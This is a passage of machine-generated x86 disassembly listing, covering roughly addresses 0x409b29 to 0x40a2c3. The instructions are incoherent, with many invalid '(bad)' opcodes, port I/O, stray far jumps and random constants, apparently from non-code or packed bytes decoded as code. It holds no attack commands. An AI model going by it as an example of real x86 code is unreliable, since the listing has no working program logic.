  409b29:	fist   WORD PTR [edx]
  409b2b:	ss repz inc ecx
  409b2e:	mov    ch,0x66
  409b30:	aaa    
  409b31:	retf   0x585b
  409b34:	cli    
  409b35:	jg     0x409b0a
  409b37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b38:	and    BYTE PTR [esi],ch
  409b3a:	sbb    BYTE PTR [ebx+0x41],ah
  409b3d:	xor    ch,BYTE PTR [esi+0x12]
  409b40:	mov    al,ss:0xec710957
  409b46:	dec    edi
  409b47:	dec    esi
  409b48:	and    eax,0xd68279eb
  409b4d:	jmp    0x1d14:0xbd3d97bb
  409b54:	leave  
  409b55:	scas   al,BYTE PTR es:[di]
  409b57:	jp     0x409b93
  409b59:	mov    edi,0xd8752d57
  409b5e:	out    dx,eax
  409b5f:	pop    ebp
  409b60:	push   ebp
  409b61:	push   ss
  409b62:	cs leave 
  409b64:	in     al,0x22
  409b66:	mov    dl,0xcf
  409b68:	mov    DWORD PTR [esp+edx*8+0x6e37b9fd],edi
  409b6f:	cdq    
  409b70:	mov    cl,0x57
  409b72:	and    eax,0xd442acd9
  409b77:	arpl   WORD PTR [ebp+ecx*4+0x61],bp
  409b7b:	pushf  
  409b7c:	leave  
  409b7d:	push   eax
  409b7e:	test   esp,ecx
  409b80:	jns    0x409b11
  409b82:	dec    ebx
  409b83:	fcmove st,st(5)
  409b85:	retf   0x8182
  409b88:	jnp    0x409b84
  409b8a:	xchg   ebp,eax
  409b8b:	mov    ?,WORD PTR [ebx-0x341cc96b]
  409b91:	xor    DWORD PTR [ebp+0x20],edi
  409b94:	sub    BYTE PTR [edi],ch
  409b96:	loopne 0x409b3a
  409b98:	mov    edi,DWORD PTR [eax+esi*2-0x50]
  409b9c:	push   edi
  409b9d:	mov    dl,0xf7
  409b9f:	call   FWORD PTR [edi]
  409ba1:	push   ebx
  409ba2:	xor    edi,DWORD PTR [ecx+0x5e2da756]
  409ba8:	jl     0x409ba6
  409baa:	inc    ecx
  409bab:	arpl   dx,dx
  409bad:	mov    ecx,0x1f1296cf
  409bb2:	inc    esi
  409bb3:	mov    edi,0x90edcdb9
  409bb8:	inc    ebp
  409bb9:	ret    0x1608
  409bbc:	mov    eax,0xc28f74f7
  409bc1:	imul   esp,DWORD PTR [esi-0x2],0x446dc04b
  409bc8:	and    eax,0x453a042e
  409bcd:	adc    ch,cl
  409bcf:	sbb    eax,0x89d296c4
  409bd4:	aam    0xb2
  409bd6:	mov    al,0xdb
  409bd8:	pop    ebp
  409bd9:	imul   esi,DWORD PTR [edi+eax*1+0x4e8189cd],0xc08231bf
  409be4:	or     BYTE PTR [eax-0x771eb668],cl
  409bea:	sub    BYTE PTR [ebx+0x6a2c14f8],ch
  409bf0:	outs   dx,DWORD PTR ds:[esi]
  409bf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bf2:	jns    0x409bc1
  409bf4:	dec    ecx
  409bf5:	jle    0x409bb9
  409bf7:	jmp    FWORD PTR [edi+0x57a8b146]
  409bfd:	and    eax,0x4c59971
  409c02:	out    dx,al
  409c03:	cmp    ah,BYTE PTR [edx]
  409c05:	push   ecx
  409c06:	xchg   edi,eax
  409c07:	scas   al,BYTE PTR es:[edi]
  409c08:	dec    esp
  409c09:	test   al,0x82
  409c0b:	sbb    BYTE PTR [ecx+0x43],0x27
  409c0f:	inc    edi
  409c10:	mov    BYTE PTR [edx+0x310e1b9d],al
  409c16:	xchg   ebp,eax
  409c17:	mov    esi,0x5068d7fa
  409c1c:	pusha  
  409c1d:	scas   al,BYTE PTR es:[edi]
  409c1e:	test   al,0xe6
  409c20:	xchg   bl,dl
  409c22:	cs ret 
  409c24:	pushf  
  409c25:	jge    0x409c9c
  409c27:	sub    ebp,DWORD PTR ds:0x6bf4f6ca
  409c2d:	cdq    
  409c2e:	xor    al,0x94
  409c30:	jns    0x409cb0
  409c32:	mov    ds:0x65a338b3,eax
  409c37:	and    DWORD PTR [edx-0x217d96d],eax
  409c3d:	sbb    BYTE PTR [edx],dh
  409c3f:	and    BYTE PTR [esi],dh
  409c41:	clc    
  409c42:	sbb    ebp,ecx
  409c44:	dec    esi
  409c45:	pop    edi
  409c46:	sbb    ecx,ecx
  409c48:	jns    0x409c80
  409c4a:	aam    0xd1
  409c4c:	ficom  DWORD PTR [edx]
  409c4e:	in     al,dx
  409c4f:	xchg   ecx,eax
  409c50:	ret    0xef4f
  409c53:	bound  ecx,QWORD PTR [ecx]
  409c55:	ins    BYTE PTR es:[edi],dx
  409c56:	sub    DWORD PTR [eax+0x58f1b621],0xfffffff2
  409c5d:	xor    esp,DWORD PTR [esi-0x45612eca]
  409c63:	enter  0xbf39,0x9b
  409c67:	scas   al,BYTE PTR es:[edi]
  409c68:	jmp    0x409cbc
  409c6a:	ror    DWORD PTR [esi-0x38],cl
  409c6d:	aaa    
  409c6e:	pop    ds
  409c6f:	mov    edi,es
  409c71:	jbe    0x409c51
  409c73:	add    DWORD PTR [edx],ecx
  409c75:	or     edx,DWORD PTR [ebx-0x345bcdc]
  409c7b:	or     BYTE PTR [ecx-0x4c841a36],bh
  409c81:	mov    gs,WORD PTR [esi-0x4e]
  409c84:	pop    edx
  409c85:	push   edx
  409c86:	mov    eax,0x275d1df7
  409c8b:	jp     0x409c32
  409c8d:	and    esi,ebx
  409c8f:	imul   ecx,DWORD PTR ds:0xe89b4e31,0xfffffffe
  409c96:	sbb    eax,0x897cd21f
  409c9b:	push   edi
  409c9c:	adc    ch,dl
  409c9e:	pusha  
  409c9f:	inc    edx
  409ca0:	xchg   edi,eax
  409ca1:	dec    edx
  409ca2:	xchg   DWORD PTR [esi-0x16],ecx
  409ca5:	xchg   esp,eax
  409ca6:	mov    WORD PTR [ecx],es
  409ca8:	xlat   BYTE PTR ds:[ebx]
  409ca9:	mov    cl,0x5a
  409cab:	sub    DWORD PTR [esi-0x355cb377],ecx
  409cb1:	mov    eax,0x79f68a47
  409cb6:	mov    al,bh
  409cb8:	or     eax,0x2be9d02a
  409cbd:	sbb    bl,BYTE PTR [edx+0x76]
  409cc0:	inc    edi
  409cc1:	jge    0x409cbc
  409cc3:	mov    ecx,0x2c838548
  409cc8:	(bad)  
  409cc9:	gs ins DWORD PTR es:[edi],dx
  409ccb:	mov    bl,0x6e
  409ccd:	test   al,0x4a
  409ccf:	push   eax
  409cd0:	repnz dec ecx
  409cd2:	stos   BYTE PTR es:[edi],al
  409cd3:	sub    ecx,DWORD PTR [ecx-0x6ef82dad]
  409cd9:	xor    esi,DWORD PTR [ebx+0x2909787f]
  409cdf:	or     BYTE PTR [esi],dl
  409ce1:	rol    DWORD PTR [esi-0x250639d8],0x8
  409ce8:	shr    DWORD PTR [ecx+0x5444f5b2],0xb9
  409cef:	push   ecx
  409cf0:	shl    BYTE PTR [esi+0x28],0x5b
  409cf4:	pop    ss
  409cf5:	into   
  409cf6:	and    BYTE PTR [eax+0x0],dl
  409cf9:	push   ebx
  409cfa:	fisubr DWORD PTR [ecx-0x73]
  409cfe:	dec    eax
  409cff:	sar    DWORD PTR [edx],0x86
  409d02:	scas   al,BYTE PTR es:[edi]
  409d03:	add    bl,BYTE PTR [ebx-0x64c0b8d9]
  409d09:	jmp    0xf236:0x837d1879
  409d10:	pop    eax
  409d11:	xchg   BYTE PTR [ebx+0x30],ch
  409d14:	sbb    DWORD PTR [ebx],edi
  409d16:	xor    al,0x7
  409d18:	or     cl,0x3d
  409d1b:	adc    al,0xb4
  409d1d:	das    
  409d1e:	push   ebp
  409d1f:	push   edx
  409d20:	in     eax,dx
  409d21:	xchg   ebp,eax
  409d22:	lods   al,BYTE PTR cs:[esi]
  409d24:	mov    edi,0xee2e04fe
  409d29:	mov    ds:0xeda537c1,eax
  409d2e:	mul    al
  409d30:	dec    esp
  409d31:	inc    esi
  409d32:	(bad)  
  409d34:	lea    ebp,[esi-0x758169bf]
  409d3a:	sahf   
  409d3b:	xor    DWORD PTR [ebx],ebx
  409d3d:	fwait
  409d3e:	adc    dh,dh
  409d40:	pop    edi
  409d41:	push   cs
  409d42:	repz das 
  409d44:	push   ss
  409d45:	sub    al,0x7f
  409d47:	call   0x977958ec
  409d4c:	adc    DWORD PTR [eax],eax
  409d4e:	call   0x4561:0xd682bdd5
  409d55:	int3   
  409d56:	int3   
  409d57:	inc    edi
  409d58:	cmp    eax,DWORD PTR ds:0x1ae975f2
  409d5e:	(bad)
  409d62:	mov    ebx,eax
  409d64:	mov    BYTE PTR [ecx+0x2],0x4b
  409d68:	push   ss
  409d69:	xchg   edi,eax
  409d6a:	xor    ah,BYTE PTR [ebx+0x2a71fa2]
  409d70:	loopne 0x409d5a
  409d72:	jns    0x409dac
  409d74:	jnp    0x409d14
  409d76:	pop    ss
  409d77:	jb     0x409d37
  409d79:	daa    
  409d7a:	xor    dh,BYTE PTR [ebx-0x266c6b2e]
  409d80:	mov    bl,0x8
  409d82:	ss (bad) 
  409d84:	push   edx
  409d85:	in     eax,dx
  409d86:	pop    eax
  409d87:	adc    eax,0x8bb2b03c
  409d8c:	dec    eax
  409d8d:	shl    BYTE PTR [edx+0x7a],0x76
  409d91:	ins    BYTE PTR es:[edi],dx
  409d92:	and    eax,0x29b80cf5
  409d97:	mov    ds:0xf032a283,eax
  409d9c:	jns    0x409e0f
  409d9e:	iret   
  409d9f:	not    DWORD PTR [edi+edx*8+0x3b68f385]
  409da6:	das    
  409da7:	mov    al,0xe0
  409da9:	sbb    DWORD PTR [ebx-0x57bf20d9],ebx
  409daf:	rcl    DWORD PTR [ecx+ebp*8],0x7c
  409db3:	mov    ecx,0x6af2c51d
  409db8:	fcom   st(7)
  409dba:	sub    eax,0x1118c9a5
  409dbf:	mov    eax,0xa4801e68
  409dc4:	mov    eax,0x44b21db8
  409dc9:	and    esi,DWORD PTR [eax-0x33]
  409dcc:	cmp    al,BYTE PTR [ecx-0x6d]
  409dcf:	sub    BYTE PTR [ebp+0x7e033de5],ah
  409dd5:	idiv   cl
  409dd7:	push   ebp
  409dd8:	pop    eax
  409dd9:	xor    al,0x2e
  409ddb:	mov    dh,cl
  409ddd:	fmul   DWORD PTR [esi-0x11c4ad20]
  409de3:	daa    
  409de4:	push   edx
  409de5:	int    0xba
  409de7:	out    dx,al
  409de8:	test   DWORD PTR [edx],edi
  409dea:	fnstcw WORD PTR [esi+0x69]
  409ded:	int    0xae
  409def:	or     BYTE PTR ds:0x277a2fa6,dh
  409df5:	sub    dh,ah
  409df7:	fnstenv [esi]
  409df9:	fwait
  409dfa:	sbb    al,0x53
  409dfc:	cmc    
  409dfd:	mov    esi,0x3e35209a
  409e02:	(bad)  
  409e04:	(bad)  
  409e05:	out    dx,eax
  409e06:	(bad)  
  409e07:	out    dx,al
  409e08:	mov    ch,0x4
  409e0a:	mov    edi,0x3d72ab2b
  409e0f:	lock hlt 
  409e11:	daa    
  409e12:	mov    eax,0xa6e3cde5
  409e17:	cmp    eax,0xc1ef5600
  409e1c:	jecxz  0x409e2c
  409e1e:	mov    ebx,0xb360f4ab
  409e23:	cmp    DWORD PTR [ecx],ecx
  409e25:	fnstsw WORD PTR [esi+0xb6ef9cc]
  409e2b:	inc    esp
  409e2c:	sub    bl,BYTE PTR [eax+0x3824dda]
  409e32:	pop    ecx
  409e33:	pop    ebp
  409e34:	sub    eax,0x368e272e
  409e39:	imul   DWORD PTR [ebp-0x71af9530]
  409e3f:	in     eax,0xc3
  409e41:	retf   0xf96
  409e44:	xchg   ecx,eax
  409e45:	dec    ebp
  409e46:	fucom  st(2)
  409e48:	stos   DWORD PTR es:[edi],eax
  409e49:	mov    ebx,DWORD PTR [ebp-0x15]
  409e4c:	xchg   ebx,eax
  409e4d:	pop    esi
  409e4e:	xlat   BYTE PTR ds:[ebx]
  409e4f:	dec    ebp
  409e50:	dec    esi
  409e51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e52:	push   ecx
  409e53:	ins    DWORD PTR es:[edi],dx
  409e54:	das    
  409e55:	dec    edx
  409e56:	jno    0x409df0
  409e58:	ins    BYTE PTR es:[edi],dx
  409e59:	aas    
  409e5a:	sub    eax,0xb7713863
  409e5f:	mov    ebp,0xbdf1622e
  409e64:	adc    eax,0xd59cbdc9
  409e69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e6a:	retf   
  409e6b:	add    cl,BYTE PTR [eax+0x22fabc76]
  409e71:	imul   edx,DWORD PTR [ebx],0xffffff92
  409e74:	sub    DWORD PTR ds:0x1e0abc0d,ebp
  409e7a:	mov    ds:0xd892c491,al
  409e7f:	js     0x409e92
  409e81:	push   esi
  409e82:	pop    edx
  409e83:	inc    ecx
  409e84:	push   edx
  409e85:	pop    edx
  409e86:	mov    eax,ds:0x9ee4f0f
  409e8b:	je     0x409eae
  409e8d:	fisub  WORD PTR [ebp+0x13]
  409e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e91:	scas   eax,DWORD PTR es:[edi]
  409e92:	adc    esi,esp
  409e94:	int3   
  409e95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e96:	adc    eax,0x3c45a7b2
  409e9b:	iret   
  409e9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e9d:	sbb    eax,0x87aa6da2
  409ea2:	test   DWORD PTR [ecx-0x10],esi
  409ea5:	dec    edx
  409ea6:	cdq    
  409ea7:	jmp    0x64e3:0x5f8daafd
  409eae:	xchg   edx,eax
  409eaf:	ret    
  409eb0:	pop    ds
  409eb1:	inc    edi
  409eb2:	push   es
  409eb3:	ret    0xe629
  409eb6:	sub    bh,BYTE PTR [esi+0x68f4e0e9]
  409ebc:	mov    edi,0x3892ff8b
  409ec1:	sbb    al,0x95
  409ec3:	ja     0x409e8e
  409ec5:	cdq    
  409ec6:	and    al,0x3c
  409ec8:	data16 jp 0x409f32
  409ecb:	mov    dl,0xd6
  409ecd:	fnstenv [ebx-0x77]
  409ed0:	aaa    
  409ed1:	cmp    al,0x71
  409ed3:	mov    ds:0x6f6b00ae,eax
  409ed8:	add    ebx,esi
  409eda:	mov    dl,0x51
  409edc:	rcr    BYTE PTR [eax],1
  409ede:	ror    BYTE PTR [eax+0x25f6a12a],cl
  409ee4:	cdq    
  409ee5:	jge    0x409eba
  409ee7:	xor    eax,0xea139391
  409eec:	pushf  
  409eed:	xor    eax,0xbf58d04
  409ef2:	xor    ah,BYTE PTR [eax]
  409ef4:	popf   
  409ef5:	lds    ebp,FWORD PTR ds:0xce7f7003
  409efb:	scas   al,BYTE PTR es:[edi]
  409efc:	dec    edx
  409efd:	adc    DWORD PTR [edx],ecx
  409eff:	in     eax,dx
  409f00:	xor    eax,0x949e4c06
  409f05:	ret    0xf2bb
  409f08:	cmp    al,BYTE PTR [ecx+0x3f]
  409f0b:	pop    ebx
  409f0c:	icebp  
  409f0d:	adc    al,0x52
  409f0f:	mov    ds:0xbb36bd60,eax
  409f14:	jmp    0x3a6f:0xeb7e090d
  409f1b:	pop    ebx
  409f1c:	inc    edi
  409f1d:	out    dx,eax
  409f1e:	jle    0x409ebd
  409f20:	pop    edi
  409f21:	dec    edx
  409f22:	nop
  409f23:	inc    eax
  409f24:	push   edi
  409f25:	cmp    BYTE PTR [esi],dh
  409f27:	or     DWORD PTR [edx+0x3],0xffffffd2
  409f2b:	and    ah,BYTE PTR [ecx]
  409f2d:	fwait
  409f2e:	repz mov bh,0xdb
  409f31:	inc    esp
  409f32:	jge    0x409f4d
  409f34:	mov    bl,0x4
  409f36:	add    cl,dl
  409f38:	jno    0x409f06
  409f3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f3b:	cmc    
  409f3c:	cmp    sp,WORD PTR [ebx+0x1d]
  409f40:	lods   al,BYTE PTR ds:[esi]
  409f41:	mov    esi,0xcdc1df0c
  409f46:	mov    edi,0xd335d0cf
  409f4b:	mov    edx,DWORD PTR [esi]
  409f4d:	xchg   esi,eax
  409f4e:	add    eax,DWORD PTR [edx+0x69]
  409f51:	into   
  409f52:	ror    DWORD PTR [ebx-0x43],1
  409f55:	push   0x6df32923
  409f5a:	cmp    bh,0x38
  409f5d:	xchg   ebx,eax
  409f5e:	add    BYTE PTR [ecx-0x6152a8bf],bl
  409f64:	xor    BYTE PTR [edi-0x15644066],ch
  409f6a:	fcom   QWORD PTR [edx]
  409f6c:	push   ds
  409f6d:	pop    ecx
  409f6e:	shl    ch,1
  409f70:	enter  0xfb52,0x3f
  409f74:	daa    
  409f75:	xchg   esp,eax
  409f76:	idiv   DWORD PTR [ebx+esi*8+0x5ec68250]
  409f7d:	push   ecx
  409f7e:	fcomp  DWORD PTR ds:0x398406c
  409f84:	stos   DWORD PTR es:[edi],eax
  409f85:	out    0xc7,al
  409f87:	data16 cmp BYTE PTR [edx+eax*4-0x42],bl
  409f8c:	(bad)  
  409f8d:	in     eax,0x26
  409f8f:	mov    al,0xc3
  409f91:	jns    0x409f6e
  409f93:	xchg   DWORD PTR [eax+ecx*8-0x2d1a8c68],edi
  409f9a:	adc    cl,dh
  409f9c:	mov    eax,ds:0xc06c79bb
  409fa1:	dec    esi
  409fa2:	add    edx,esp
  409fa4:	push   ebp
  409fa5:	sub    BYTE PTR [edx],dh
  409fa7:	ins    DWORD PTR es:[edi],dx
  409fa8:	addr16 push ecx
  409faa:	shl    BYTE PTR [esi-0x28],0x52
  409fae:	cmp    eax,0x93e549be
  409fb3:	retf   
  409fb4:	cld    
  409fb5:	xchg   ebx,eax
  409fb6:	and    al,dl
  409fb8:	jp     0x409f40
  409fba:	outs   dx,DWORD PTR ds:[esi]
  409fbb:	dec    ebx
  409fbc:	ds lahf 
  409fbe:	fmul   DWORD PTR [ebx-0x26]
  409fc1:	jle    0x409f50
  409fc3:	rcr    DWORD PTR [eax],cl
  409fc5:	addr16 aas 
  409fc7:	jg     0x409f9a
  409fc9:	into   
  409fca:	jne    0x409f7b
  409fcc:	jmp    0x1ddd:0x4010998f
  409fd3:	cmp    eax,0x3ef1ae83
  409fd8:	xchg   esi,eax
  409fd9:	dec    ebx
  409fda:	and    al,0xe6
  409fdc:	or     eax,0xf163bf96
  409fe1:	pop    ss
  409fe2:	and    edi,edi
  409fe4:	sbb    bh,BYTE PTR [eax+0x60]
  409fe7:	mov    ds:0x14169e6d,eax
  409fec:	mov    ch,0x4
  409fee:	inc    DWORD PTR [ecx+eax*1+0x35]
  409ff2:	aaa    
  409ff3:	dec    edx
  409ff4:	inc    eax
  409ff5:	aaa    
  409ff6:	adc    al,0x4f
  409ff8:	add    dl,BYTE PTR [esi+0xc7c425f]
  409ffe:	lea    esi,es:[edx]
  40a001:	xchg   edx,eax
  40a002:	inc    edx
  40a003:	adc    DWORD PTR [eax+0x7a],ebx
  40a006:	mov    edx,ebx
  40a008:	test   DWORD PTR [edx+ebp*4-0x6081631c],0x50fcf8f8
  40a013:	sti    
  40a014:	sar    BYTE PTR [ebx-0x679c5ac4],cl
  40a01a:	push   edi
  40a01b:	ins    BYTE PTR es:[edi],dx
  40a01c:	test   BYTE PTR [ebp-0x7d],cl
  40a01f:	popa   
  40a020:	pop    esi
  40a021:	add    ah,dl
  40a023:	out    dx,al
  40a024:	neg    DWORD PTR [ecx+esi*4+0x57f88e09]
  40a02b:	pop    es
  40a02c:	dec    esp
  40a02d:	repnz inc esi
  40a02f:	jecxz  0x40a0a9
  40a031:	fst    QWORD PTR [ebx+0x2]
  40a034:	push   0x8f35bf7c
  40a039:	fsub   DWORD PTR [esp+edi*2]
  40a03c:	sbb    ebp,DWORD PTR [eax+esi*4+0x5a]
  40a040:	and    edx,DWORD PTR [ecx+0x7b]
  40a043:	jecxz  0x40a084
  40a045:	push   ss
  40a046:	adc    BYTE PTR [ebp+0x68],0x64
  40a04a:	push   edi
  40a04b:	pop    esi
  40a04c:	push   ecx
  40a04d:	retf   0xc21a
  40a050:	inc    edx
  40a051:	popf   
  40a052:	and    DWORD PTR [edx+0x35776a39],0x248a75fa
  40a05c:	in     eax,dx
  40a05d:	iret   
  40a05e:	and    al,0xa7
  40a060:	out    0x95,eax
  40a062:	sbb    ebp,DWORD PTR [ebp+0x4d]
  40a065:	add    esi,ebx
  40a067:	pop    ebp
  40a068:	adc    al,0x73
  40a06a:	popf   
  40a06b:	and    DWORD PTR [ebx+edi*1],0xc7bb814d
  40a072:	sbb    ecx,edx
  40a074:	mov    ?,WORD PTR ds:0x2deca1cc
  40a07a:	in     eax,0x80
  40a07c:	das    
  40a07d:	out    dx,al
  40a07e:	clc    
  40a07f:	cmp    edx,DWORD PTR [eax-0x5b89dfb5]
  40a085:	inc    esi
  40a086:	push   eax
  40a087:	mov    eax,0xae886a00
  40a08c:	fwait
  40a08d:	or     bh,bl
  40a08f:	dec    DWORD PTR [eax+ecx*8]
  40a092:	jns    0x40a019
  40a094:	jno    0x40a04b
  40a096:	jmp    0x40a0bb
  40a098:	lods   eax,DWORD PTR ds:[esi]
  40a099:	mov    edi,DWORD PTR [ebp+0x3e32aabc]
  40a09f:	sbb    ebp,edi
  40a0a1:	adc    BYTE PTR [edi-0x65],bh
  40a0a4:	pop    ecx
  40a0a5:	cmc    
  40a0a6:	js     0x40a041
  40a0a8:	sbb    ebx,DWORD PTR [edx+0x5e]
  40a0ab:	ja     0x40a08f
  40a0ad:	sub    al,0x71
  40a0af:	jae    0x40a0e6
  40a0b1:	in     eax,dx
  40a0b2:	mov    esi,0x50cfe856
  40a0b7:	xchg   edx,eax
  40a0b8:	inc    edi
  40a0b9:	xchg   ebx,esi
  40a0bb:	adc    BYTE PTR [ecx+0x7a96793f],dh
  40a0c1:	add    ch,BYTE PTR [edx+0x17a4e524]
  40a0c7:	ret    0x78cd
  40a0ca:	ret    0x2960
  40a0cd:	jl     0x40a07c
  40a0cf:	shr    ah,cl
  40a0d1:	xchg   ebp,eax
  40a0d2:	aam    0x13
  40a0d4:	nop
  40a0d5:	test   eax,0xcbd11c28
  40a0da:	sti    
  40a0db:	fcmovnb st,st(1)
  40a0dd:	clc    
  40a0de:	add    al,0x29
  40a0e0:	test   eax,0x8b5ccaf0
  40a0e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0e7:	adc    edx,DWORD PTR [edx+eax*8-0x1c]
  40a0eb:	push   eax
  40a0ec:	scas   eax,DWORD PTR es:[edi]
  40a0ed:	xchg   edi,eax
  40a0ee:	add    dl,ch
  40a0f0:	and    al,ch
  40a0f2:	mov    bl,0xbc
  40a0f4:	mov    ebp,0x7c51ad77
  40a0f9:	inc    ebx
  40a0fa:	bound  esp,QWORD PTR [edi-0x74]
  40a0fd:	iret   
  40a0fe:	loope  0x40a0c5
  40a100:	adc    DWORD PTR [edi+0x5dd3f3ec],0x37
  40a107:	mov    bh,BYTE PTR [ebx]
  40a109:	lods   al,BYTE PTR ds:[esi]
  40a10a:	daa    
  40a10b:	xor    edi,ebx
  40a10d:	mov    al,ds:0xda1f1a78
  40a112:	inc    ebp
  40a113:	(bad)  
  40a115:	dec    edx
  40a116:	shld   DWORD PTR [ecx+ebx*8-0x76],ebp,cl
  40a11b:	cmc    
  40a11c:	fnstenv [edx+0x36]
  40a11f:	je     0x40a0c3
  40a121:	mov    dl,0x74
  40a123:	adc    BYTE PTR [esp+ebp*4+0xf72a7a5],ah
  40a12a:	mov    eax,0xbdc536f
  40a12f:	xor    eax,0xe676453a
  40a134:	push   ss
  40a135:	xchg   ebx,eax
  40a136:	or     eax,DWORD PTR [edx+0x7a785b2e]
  40a13c:	xor    ch,cl
  40a13e:	popf   
  40a13f:	dec    esi
  40a140:	push   ds
  40a141:	je     0x40a1bb
  40a143:	imul   ecx,DWORD PTR [edx+0x15],0x5d
  40a147:	cmp    ch,dl
  40a149:	adc    al,0x7b
  40a14b:	icebp  
  40a14c:	mov    edi,0xb271b57b
  40a151:	inc    ebp
  40a152:	add    al,0xc8
  40a154:	leave  
  40a155:	mov    dh,0x24
  40a157:	xchg   esi,eax
  40a158:	clc    
  40a159:	iret   
  40a15a:	je     0x40a1b2
  40a15c:	or     eax,0x9d381b6
  40a161:	scas   al,BYTE PTR es:[edi]
  40a162:	mov    esp,0x1b362720
  40a167:	call   0xb9bf:0x3ad1ce54
  40a16e:	outs   dx,DWORD PTR ds:[esi]
  40a16f:	ffreep st(2)
  40a171:	fild   WORD PTR [ebp+0x4]
  40a174:	sub    dl,BYTE PTR [edi+0x68]
  40a177:	(bad)  
  40a178:	nop
  40a179:	jb     0x40a11e
  40a17b:	and    bh,BYTE PTR [ebp+0x33116aa2]
  40a181:	call   FWORD PTR [esi+0x9]
  40a184:	fdivr  QWORD PTR [esi-0x7ccea50]
  40a18a:	dec    eax
  40a18b:	dec    esp
  40a18c:	stc    
  40a18d:	test   BYTE PTR [ecx+0x19d52a05],dh
  40a193:	addr16 xchg ebp,eax
  40a195:	frstor [esi+0x7d739e7b]
  40a19b:	icebp  
  40a19c:	mov    ebx,0x6e004934
  40a1a1:	pop    eax
  40a1a2:	jnp    0x40a191
  40a1a4:	out    dx,al
  40a1a5:	adc    edx,DWORD PTR [esi+0x35]
  40a1a8:	test   eax,0xfc6780ce
  40a1ad:	xor    ch,bl
  40a1af:	fcomp  DWORD PTR [ecx]
  40a1b1:	sub    eax,0xebf86e5a
  40a1b6:	and    bl,BYTE PTR [eax+0x18]
  40a1b9:	test   al,0xde
  40a1bb:	in     al,dx
  40a1bc:	cmp    bl,al
  40a1be:	adc    edx,DWORD PTR [edx]
  40a1c0:	jno    0x40a1c8
  40a1c2:	ins    BYTE PTR es:[edi],dx
  40a1c3:	xor    ecx,DWORD PTR [edx+eax*8+0x4f92f6e1]
  40a1ca:	inc    ecx
  40a1cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1cc:	pop    eax
  40a1cd:	pushf  
  40a1ce:	daa    
  40a1cf:	push   ebp
  40a1d0:	inc    esp
  40a1d1:	ins    BYTE PTR es:[edi],dx
  40a1d2:	test   eax,0xcad39db5
  40a1d7:	aam    0xf8
  40a1d9:	dec    bh
  40a1db:	mov    eax,0x24467225
  40a1e0:	cmp    ah,bl
  40a1e2:	add    DWORD PTR [edi-0x29],edx
  40a1e5:	in     al,0x7f
  40a1e7:	popf   
  40a1e8:	mov    ch,BYTE PTR [ecx+0x72]
  40a1eb:	add    al,0x3b
  40a1ed:	inc    edx
  40a1ee:	lods   eax,DWORD PTR ds:[esi]
  40a1ef:	push   0xffffffb3
  40a1f1:	ficomp WORD PTR ds:0x399114eb
  40a1f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1f8:	push   es
  40a1f9:	push   ds
  40a1fa:	inc    esi
  40a1fb:	shl    DWORD PTR [ecx],1
  40a1fd:	add    esp,DWORD PTR [eax-0x61]
  40a200:	mov    esi,0x3d53fac2
  40a205:	push   ss
  40a206:	lock mov ecx,esp
  40a209:	and    dl,dl
  40a20b:	fidivr WORD PTR [eax-0x1c]
  40a20e:	lds    eax,FWORD PTR [eax]
  40a210:	inc    esp
  40a211:	js     0x40a1b8
  40a213:	call   0x6a6181d1
  40a218:	in     eax,dx
  40a219:	bound  ebp,QWORD PTR [eax-0x70285a3f]
  40a21f:	and    dl,BYTE PTR [esi+0x5]
  40a222:	jmp    0x24aeba2b
  40a227:	sbb    al,0xc3
  40a229:	inc    edx
  40a22a:	push   es
  40a22b:	adc    al,0xad
  40a22d:	cwde   
  40a22e:	dec    eax
  40a22f:	xor    dl,BYTE PTR [ebx+ebx*4-0x7e3a9c6d]
  40a236:	into   
  40a237:	mov    ah,0x1b
  40a239:	shl    DWORD PTR [eax+0x7f70f5ad],0x9d
  40a240:	int    0x93
  40a242:	sub    al,0xa2
  40a244:	pop    eax
  40a245:	stc    
  40a246:	pushf  
  40a247:	ds xor edi,edx
  40a24a:	arpl   dx,bp
  40a24c:	and    bh,dh
  40a24e:	pop    ebp
  40a24f:	in     eax,dx
  40a250:	das    
  40a251:	mov    ds:0xe69fcaf8,al
  40a256:	stc    
  40a257:	cmp    ebx,DWORD PTR [esi-0x3d]
  40a25a:	jo     0x40a27d
  40a25c:	mov    al,ds:0xf9fea097
  40a261:	sub    eax,0xd78d49d5
  40a266:	leave  
  40a267:	fnstenv [edx+0x32]
  40a26a:	rol    DWORD PTR [eax+0x30952d93],cl
  40a270:	and    BYTE PTR [eax+0x70a5389c],bl
  40a276:	mov    eax,0xd056f87e
  40a27b:	fld    DWORD PTR [ecx]
  40a27d:	in     eax,dx
  40a27e:	or     ecx,DWORD PTR [edx-0x14]
  40a281:	jo     0x40a2c3
  40a283:	adc    ebp,ebx
  40a285:	add    al,0x93
  40a287:	ror    BYTE PTR [ebp-0x16c7d4dd],1
  40a28d:	xor    ah,ah
  40a28f:	lock out dx,eax
  40a291:	inc    esi
  40a292:	pop    ds
  40a293:	adc    al,0x9c
  40a295:	inc    eax
  40a296:	push   esi
  40a297:	adc    cl,bh
  40a299:	loope  0x40a267
  40a29b:	jbe    0x40a277
  40a29d:	in     al,0xce
  40a29f:	data16 adc ah,dh
  40a2a2:	and    ah,BYTE PTR [esp-0x12]
  40a2a6:	or     BYTE PTR [edi],cl
  40a2a8:	add    dh,BYTE PTR [eax]
  40a2aa:	dec    esp
  40a2ab:	aam    0x74
  40a2ad:	pop    ecx
  40a2ae:	retf   
  40a2af:	das    
  40a2b0:	lea    ebp,[eax-0x20]
  40a2b3:	inc    ebx
  40a2b4:	mov    edi,0x64998a11
  40a2b9:	xchg   BYTE PTR [ecx],al
  40a2bb:	out    0x3d,al
  40a2bd:	(bad)  
  40a2be:	add    ch,BYTE PTR [esi]
  40a2c0:	int3   
  40a2c1:	inc    esp
  40a2c2:	inc    ebx
  40a2c3:	(bad)  
